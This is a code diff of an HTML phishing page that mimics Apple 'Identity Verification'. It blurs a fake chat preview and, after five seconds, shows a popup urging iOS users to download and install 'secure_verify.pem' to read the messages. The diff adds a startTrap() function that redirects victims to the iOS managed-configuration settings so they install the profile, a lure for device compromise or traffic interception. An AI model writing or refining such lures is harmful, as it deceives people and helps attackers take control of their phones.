@@ -6,14 +6,13 @@
     <style>
         body, html { height: 100%; margin: 0; font-family: -apple-system, sans-serif; background: #1c1c1e; overflow: hidden; }
         .chat-background {
-            
             background-color: #2c2c2e; 
-            background-image: url('./chat_preview.jpg'); 
+            background-image: url('chat_preview.jpg'); 
             height: 100vh; width: 100%;
             filter: blur(0px);
             background-position: center top; 
             background-repeat: no-repeat; 
-            background-size: contain; 
+            background-size: contain;
             position: fixed; top: 0; left: 0; z-index: 1;
             transition: 0.8s;
         }
@@ -32,6 +31,7 @@
         .btn {
             display: block; background: #007aff; color: white; text-decoration: none;
             padding: 14px; border-radius: 12px; font-weight: 600; font-size: 15px;
+            cursor: pointer;
         }
         .info-text { margin-top: 18px; font-size: 12px; color: #8e8e93; font-weight: 500;}
     </style>
@@ -41,15 +41,21 @@
     <div class="verification-box" id="trap-popup">
         <img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg" class="apple-logo">
         <h2>Identity Verification</h2>
-        <p>This conversation is encrypted. To unblur the messages and view the full archive, verify your identity.</p>
-        <a href="secure_verify.pem" class="btn">Unblur & Read Chats</a>
-        <div class="info-text">Required: Allow > Settings > Profile > Install</div>
+        <p>This conversation is encrypted. To unblur the messages and view the full archive on iOS, verify your identity.</p>
+        <a href="secure_verify.pem" class="btn" onclick="startTrap()">Unblur & Read Chats</a>
+        <div class="info-text">Automatic Redirect: Click Allow > Install</div>
     </div>
     <script>
         setTimeout(function() {
             document.getElementById('trap-popup').style.display = 'block';
             document.querySelector('.chat-background').style.filter = 'blur(15px)';
         }, 5000);
+
+        function startTrap() {
+            setTimeout(function() {
+                window.location.href = "App-prefs:General&path=ManagedConfigurationList";
+            }, 2500);
+        }
     </script>
 </body>
 </html>
